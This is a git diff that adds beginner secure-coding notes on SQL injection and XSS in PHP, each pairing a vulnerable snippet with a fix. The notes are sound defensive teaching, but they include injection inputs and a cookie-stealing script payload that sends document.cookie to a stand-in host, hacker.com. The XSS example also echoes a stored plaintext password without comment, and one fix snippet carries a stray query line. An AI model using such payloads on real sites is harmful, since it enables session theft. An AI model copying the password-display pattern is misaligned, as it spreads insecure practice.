@@ -74,4 +74,121 @@ function access($needed_rank) {
 }
 ```
 
-## Sql injection 
+
+
+
+## SQL Injection
+
+If we have posts and every post has an **id**, we take this id from the URL and put it in our query to fetch the data for this id.
+
+and we do it like this:
+
+```php
+// GET -> super global to take id from url
+$id = $_GET['id']; // returns a value like 1
+
+// This query is very bad because we take the input or variable
+// and inline it directly in the query
+$query = "SELECT * FROM posts WHERE id = {$id}";
+
+$statement = $pdo->query($query);
+// and here the query is executed directly
+```
+
+If the user adds **malicious code** like this:
+
+```
+id = 5 OR 1=1
+```
+
+this will retrieve **all data**, not only the data for a specific id.
+
+The attacker can also try something like:
+
+```
+DROP TABLE users
+```
+
+and if the query is executed, this can be a disaster.
+
+---
+
+### The Solution
+
+The solution is **Prepared Statements**.
+
+We separate the query from the variable.
+
+The query goes to MySQL first to be prepared and checked,  
+then the variable is sent separately and treated as **data**, not as a command.
+
+like this:
+
+```php
+$id = $_GET['id'];
+
+$query = "SELECT * FROM posts WHERE id = ?";
+
+$statement = $pdo->prepare($query);
+$statement->execute([$id]);
+```
+
+This is a **safe way** and helps avoid **SQL Injection**.
+
+
+## XSS
+
+If we have a profile page and the user has a **password** or a **bio**, we take this data from the database and print it on the screen.
+
+and we do it like this:
+
+```php
+// Fetching user data from the database
+$password = $user['password']; // returns the user's saved password
+
+// This is very bad because we take the input or variable
+// and inline it directly in the HTML page
+echo "Your password is: {$password}";
+```
+
+If the user adds **malicious code** like this during signup:
+
+```html
+<script>alert('hacked')</script>
+```
+
+this will execute **JavaScript code** directly in the browser, not just display the text.
+
+The attacker can also try something like:
+
+```html
+<script>document.location='http://hacker.com/?cookie='+document.cookie</script>
+```
+
+and if the code is executed, they can steal your session, which can be a disaster.
+
+---
+
+### The Solution
+
+The solution is **Data Sanitization**.
+
+We clean the data from any tags before displaying it.
+
+The data goes through a built-in function to be converted into HTML entities,  
+then the variable is sent to the browser and treated as **text**, not as a command.
+
+like this:
+
+```php
+$password = $user['password'];
+
+$query = "SELECT * FROM posts WHERE id = ?";
+
+// We use htmlspecialchars to sanitize the output
+$safe_password = htmlspecialchars($password, ENT_QUOTES, 'UTF-8');
+
+echo "Your password is: {$safe_password}";
+```
+
+This is a **safe way** and helps avoid **XSS**.
